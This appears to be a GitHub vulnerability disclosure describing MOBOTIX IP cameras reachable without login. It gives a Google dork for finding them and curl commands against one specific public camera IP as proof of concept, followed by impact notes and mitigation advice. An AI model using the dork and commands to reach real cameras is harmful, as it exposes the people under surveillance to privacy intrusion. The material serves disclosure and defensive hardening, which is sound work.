# 📸 Unauthenticated Access to MOBOTIX IP Cameras via Direct IP

_Discovered and documented by **hasanwlip**_
![Screenshot 2025-06-16 032841](https://github.com/user-attachments/assets/1befe0f4-2a06-4ddc-a104-bf2c60c3eae8)


---

## 📝 Description

Multiple MOBOTIX IP cameras are publicly exposed on the internet and can be accessed directly via their IP addresses **without any authentication**. These systems allow anyone to view the camera interface and in some cases access live streams, snapshots, or even interact with PTZ functions.

This vulnerability is the result of misconfigured devices left accessible without enforcing login authentication, and is easily discoverable using a basic Google Dork.

---

## 🔎 Google Dork

```bash
intext:"© 2001-2025 MOBOTIX" -site:*.* -inurl:www
```

This Dork identifies IP-based publicly exposed MOBOTIX camera interfaces.

---

## 🧪 Proof of Concept (PoC)

```bash
# Step 1: Search via Google Dork
# Result example: http://195.70.120.133/

# Step 2: Visit the IP in a browser
# The camera interface loads directly without requiring any authentication.

# Step 3: Capture the camera interface content using cURL
curl http://195.70.120.133/cgi-bin/guestimage.html

# Optional: Save the raw HTML content to a file
curl http://195.70.120.133/cgi-bin/guestimage.html --output snap.html
```

> 🔐 No login is required. The interface, image stream, or control elements are publicly accessible.

---

## ⚠️ Impact

- Unauthenticated access to live video feed
- In some cases, control over camera functions (pan/tilt/zoom)
- Violation of privacy laws and surveillance leakage

---

## 📌 Recommendations

- Enforce HTTP basic authentication or token-based access
- Whitelist internal IPs or use VPN
- Remove public IP exposure and block access via firewall
- Regularly audit public-facing IoT devices

---

## 🔗 References

1. Google Dork Search: [MOBOTIX IP Dork](https://www.google.com/search?q=intext:%22%C2%A9+2001-2025+MOBOTIX%22+-site:*.*+-inurl:www)
2. Official Vendor Website: [https://www.mobotix.com/en](https://www.mobotix.com/en)
3. Exploited Instance: _(will be updated manually once published)_
4. Research and disclosure by: **hasanwlip**

---

## ✅ Status

This issue has been manually verified on multiple IPs. Dozens of exposed systems were accessible at the time of testing. The vulnerability stems from poor configuration, not a software flaw.

Feel free to fork or share responsibly under coordinated disclosure guidelines.

---

## 📬 Contact

For coordination or acknowledgment:
**hasanwlip** on GitHub / Telegram / email (optional to publish)

---

_This exploit is for educational and ethical research purposes only._

---
